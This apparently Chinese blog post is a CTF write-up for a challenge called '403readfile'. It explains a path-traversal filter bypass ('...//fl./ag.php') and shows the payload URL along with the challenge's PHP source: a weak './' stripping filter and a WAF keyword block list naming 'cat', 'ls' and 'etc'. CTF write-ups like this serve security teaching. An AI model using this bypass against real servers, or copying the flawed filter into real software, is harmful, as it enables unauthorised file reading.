<h4 id="403readfile"><a href="#403readfile" class="headerlink" title="403readfile"></a>403readfile</h4><p><code>index.php</code>是一个伪造的403页面，扫描得到<code>robots.txt，flag.php，get.php</code> </p>
<p>看意思就是说通过<code>get.php</code>访问到<code>flag.php</code>即可得到<code>flag</code></p>
<p>尝试了一堆姿势，都没用感觉应该是什么玩意被过滤了</p>
<p>这题没做出来，后来看<code>write up</code>得知有个<code>hint.txt</code>提示<code>./</code>被过滤为空(./1.txt和1.txt回显一样)</p>
<p>这样就可以构造<code>fl./ag.php和...//</code>绕过对<code>flag.php和../</code>的过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49.4.68.67:91&#x2F;get.php?file&#x3D;...&#x2F;&#x2F;fl.&#x2F;ag.php</span><br></pre></td></tr></table></figure>

<p>顺便摸一下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">"waf.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"missing file parameters,try &lt;a href=\"./get.php?file=./1.txt\"&gt;this&lt;/a&gt;"</span>);</span><br><span class="line">$p = $_GET[<span class="string">'file'</span>];</span><br><span class="line">$p=str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$p);</span><br><span class="line">$p=str_replace(<span class="string">".\\"</span>,<span class="string">""</span>,$p);</span><br><span class="line">$b=substr(strstr($p, <span class="string">".."</span>), <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(strstr($b, <span class="string">"../"</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Too many ../"</span>);</span><br><span class="line">$p=<span class="string">'resource/'</span>.$p;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($p))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"file not found"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($p);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//waf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">	parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line">    $keywords = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">"union"</span>,</span><br><span class="line">        <span class="string">"select"</span>,</span><br><span class="line">        <span class="string">"insert"</span>,</span><br><span class="line">        <span class="string">"where"</span>,</span><br><span class="line">        <span class="string">"update"</span>,</span><br><span class="line">        <span class="string">"order"</span>,</span><br><span class="line">        <span class="string">"flag"</span>,</span><br><span class="line">        <span class="string">"delete"</span>,</span><br><span class="line">        <span class="string">"*"</span>,</span><br><span class="line">        <span class="string">"~"</span>,</span><br><span class="line">        <span class="string">"ls"</span>,</span><br><span class="line">        <span class="string">"cat"</span>,</span><br><span class="line">        <span class="string">"dir"</span>,</span><br><span class="line">        <span class="string">"&lt;"</span>,</span><br><span class="line">        <span class="string">"waf"</span>,</span><br><span class="line">        <span class="string">"index"</span>,</span><br><span class="line">        <span class="string">"get"</span>,</span><br><span class="line">        <span class="string">"&amp;"</span>,</span><br><span class="line">        <span class="string">"%"</span>,</span><br><span class="line">		<span class="string">"etc"</span>,</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stristr($k, $token))&#123;erequest();&#125;</span><br><span class="line">            <span class="keyword">if</span>(stristr($v, $token))&#123;erequest();&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">erequest</span><span class="params">($s)</span></span>&#123;<span class="keyword">die</span>(<span class="string">'&lt;h3&gt;想干什么，大黑阔！&lt;/h3&gt;'</span>);&#125;</span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line">&lt;p&gt;这样就给flag是不是太简单了&lt;/p&gt;</span><br><span class="line">&lt;p&gt;flag&#123;this_is_not_true&#125;&lt;/p&gt;</span><br><span class="line">&lt;!--hahaha,骗你的,我才不会给你flag呢--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//true_flag:SUCTF&#123;YXV0aG9yX2lzX1Bpa3VZb2FrZQ==&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="secure-html"><a href="#secure-html" class="headerlink" title="secure html"></a>secure html</h4>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>root</div>
      <div>2018-11-14</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>

      <a class="tag-link" href="/tags/ctf/" rel="tag">#ctf</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
